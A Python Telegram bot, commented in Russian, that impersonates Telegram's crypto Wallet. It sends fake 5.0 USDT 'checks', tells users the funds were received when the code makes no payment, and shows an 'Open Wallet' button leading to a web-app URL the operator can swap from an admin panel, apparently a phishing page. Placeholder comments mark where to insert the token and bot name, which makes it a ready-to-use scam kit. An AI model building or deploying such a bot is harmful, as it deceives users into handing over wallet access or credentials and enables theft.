from telebot import types
import telebot

#сюда токен бота
bot = telebot.TeleBot('TOKEN')


#здесь тг айди админа для админ панели
ADMIN_ID = 888888888


current_url = "ССЫЛКА ТУТ"
user_status = {}

def admin_keyboard():
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("🔗 Поменять ссылку")
    btn2 = types.KeyboardButton("🧾 Создать новый чек")
    keyboard.add(btn1, btn2)
    return keyboard

def wallet_message(chat_id, activated=False):
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("👛 Открыть Кошелёк", web_app=types.WebAppInfo(current_url))
    markup.add(btn)

    if activated:
        # Сообщение об активации БЕЗ картинки
        bot.send_message(
            chat_id,
            "*✅ Вы получили: 5.0 USDT ~5.00 USD*",
            parse_mode='Markdown',
            reply_markup=markup
        )
    else:
        # Стандартное сообщение С картинкой
        with open('wall.png', 'rb') as photo:
            bot.send_photo(
                chat_id,
                photo,
                caption="*Ваш Кошелёк уже настроен.*\nТеперь вы можете использовать криптовалюты прямо в Telegram.",
                parse_mode='Markdown',
                reply_markup=markup
            )

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, "👑 Админ-панель:", reply_markup=admin_keyboard())
        return

    user_id = message.from_user.id
    command_parts = message.text.split()

    if len(command_parts) > 1:
        if not user_status.get(user_id, False):
            user_status[user_id] = True
            wallet_message(message.chat.id, activated=True)  # Активация
        else:
            wallet_message(message.chat.id, activated=False) # Уже активирован
    else:
        wallet_message(message.chat.id, activated=False)     # Обычный старт

@bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID)
def handle_admin_actions(message):
    global current_url

    if message.text == "🔗 Поменять ссылку":
        msg = bot.send_message(message.chat.id, "Введите новую ссылку:")
        bot.register_next_step_handler(msg, process_new_url)
    elif message.text == "🧾 Создать новый чек":
        markup = types.InlineKeyboardMarkup()
        #поменяйту тут на юз своего бота вместо USERNAME
        deep_link = f"https://t.me/USERNAME?start=claim_{message.message_id}"
        btn = types.InlineKeyboardButton("👛 Получить", url=deep_link)
        markup.add(btn)

        bot.send_message(
            message.chat.id,
            "*👛 Чек на 5.0 USDT (~5.0 USD):*",
            parse_mode='Markdown',
            reply_markup=markup
        )

def process_new_url(message):
    global current_url
    current_url = message.text
    bot.send_message(message.chat.id, f"✅ Ссылка успешно изменена на:\n{current_url}")

if __name__ == '__main__':
    bot.infinity_polling()
